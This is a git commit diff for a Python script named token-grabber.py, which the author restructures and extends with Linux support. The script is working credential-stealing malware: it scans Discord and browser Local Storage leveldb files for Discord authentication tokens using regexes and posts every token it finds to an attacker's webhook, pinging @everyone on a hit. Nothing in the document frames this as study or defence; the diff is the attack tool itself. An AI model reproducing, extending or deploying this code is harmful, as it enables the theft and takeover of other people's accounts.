3234357fa1bb760b5cf3096ee127db135fcef5f0
Amirmahdi Tafreshi <a.tafreshi440@gmail.com>
2021-05-06 03:55:36 +0430

    Restructure the original code and add Linux support

--- token-grabber.py
+++ token-grabber.py
@@ -1,53 +1,69 @@
 import os
 import re
 import json
-
-from urllib.request import Request, urlopen
-
+from sys import platform
+import requests
 # your webhook URL
-WEBHOOK_URL = 'WEBHOOK HERE'
+WEBHOOK_URL = ''
 
 # mentions you when you get a hit
-PING_ME = False
+PING_ME = True
 
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+def send_message(message):
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+    payload = json.dumps({'content': message})
+    req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
+
+def find_tokens(path, platform):
+    separator = "/"
+    if platform == "linux" or platform == "linux2":
+        separator = "/"
+    elif platform == "win32":
+        separator = "\\"
+    path += separator+'Local Storage'+separator+'leveldb'
 
     tokens = []
-
     for file_name in os.listdir(path):
         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
             continue
-
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+        for line in [x.strip() for x in open(f'{path}{separator}{file_name}', errors='ignore').readlines() if x.strip()]:
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
 
-def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
+def main(platform):
+    if platform == "linux" or platform == "linux2":
+        configdir = "/home/amirmahdi/.config"
+        paths = {
+            'Discord': configdir + '/Discord',
+            'Discord Canary': configdir + '/discordcanary',
+            'Discord PTB': configdir + '/discordptb',
+        }
+    elif platform == "win32":
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+        paths = {
+            'Discord': roaming + '\\Discord',
+            'Discord Canary': roaming + '\\discordcanary',
+            'Discord PTB': roaming + '\\discordptb',
+            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+            'Opera': roaming + '\\Opera Software\\Opera Stable',
+            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        }
 
     message = '@everyone' if PING_ME else ''
 
-    for platform, path in paths.items():
+    for app, path in paths.items():
         if not os.path.exists(path):
             continue
+        message += f'\n**{app}**\n```\n'
 
-        message += f'\n**{platform}**\n```\n'
-
-        tokens = find_tokens(path)
+        tokens = find_tokens(path, platform)
 
         if len(tokens) > 0:
             for token in tokens:
@@ -57,18 +73,7 @@ def main():
 
         message += '```'
 
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-    }
+    send_message(message)
 
-    payload = json.dumps({'content': message})
-
-    try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
-    except:
-        pass
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":       
+    main(platform)
